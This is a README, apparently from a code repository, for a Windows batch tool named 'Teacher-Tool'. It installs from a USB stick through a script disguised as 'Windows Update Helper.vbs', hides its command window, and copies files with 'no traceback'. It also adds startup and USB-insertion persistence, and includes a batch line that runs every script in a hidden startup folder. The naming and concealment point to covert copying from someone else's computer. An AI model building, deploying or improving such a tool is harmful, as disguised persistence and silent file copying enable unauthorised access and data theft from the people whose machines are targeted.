# Teacher-Tool

Batch program created to enable quick copying with "0" traceback 

# How to install and use

to install, you need "Windows Update Helper.vbs", lmao.bat and lmao69.dat on the *root* of the usb

Installation takes around 5 seconds, however most of this time, the cmd is invisible

after install you only need lmao69.dat with "initcopy" inside

# File Options

novbs.dat -> enables "Debug" mode meaning that you can see the cmd window

dontcopy.dat -> disables copying

UNIN000.dat -> uninstalls the "tool"

atinsert.dat -> adds programs to be executed at usb insertion (only .bat)

atstartup.dat -> adds programs to be executed at startup (only .bat)

code for handling these :
`if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in () do (call "%%a"))`

lmao69.dat -> file responsible for detecting the usb. needs "initcopy" or .bat filename inside (gets executed) to work (ESSENTIAL)

force_dat.dat -> if the program doesn't check the file for some reason (i.e. the check for file of initcopy is disabled), this forces the check

# 2 additional modules

I have also added 2 additional .bat files that help with certain stuff. First one is uninstallexts.dat, which is used to delete all extra apps installed by atstartup or atinsert

and alwaysinit.bat which skips the lmao69.dat check (to check for .bat or initcopy)

## Current version: 3.1
